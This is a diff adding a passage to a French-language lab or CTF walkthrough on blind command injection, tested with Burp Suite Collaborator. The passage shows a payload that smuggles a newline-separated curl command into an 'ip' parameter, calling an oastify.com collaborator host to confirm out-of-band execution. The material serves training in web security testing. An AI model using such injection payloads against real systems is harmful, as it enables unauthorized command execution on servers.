@@ -108,3 +108,28 @@ Nous allons récupérer le collaborator pour récupérer la requête http via cu
 
 Cliquer sur le carré orange, celui-ci va copier dans votre presse papier l'URL donnée par Burpsuite.
 
+Maintenant que votre lien est copié, nous allons essayer d'effectuer un curl pour voir si notre serveur récupère la requête. 
+
+N'OUBLIEZ PAS DE RAJOUTER http:// DEVANT VOTRE LIEN ! 
+
+On se retrouve donc avec : 
+
+```bash
+ip=127.0.0.1%0acurl+http://Votre_lien_copier
+```
+
+Pour ma part cela me donne : 
+
+```bash
+ip=127.0.0.1%0acurl+http://ple70m7531ee2cdvwaqd6ps67xdo1jp8.oastify.com
+```
+
+![](../img/Pasted%20image%2020261014235743.png)
+
+
+Parfait, allons voir notre onglet Collaborator : 
+
+![](../img/Pasted%20image%2020261014235821.png)
+
+Il faut savoir que si cela met du temps, je vous conseille de cliquer sur "Poll now".
+
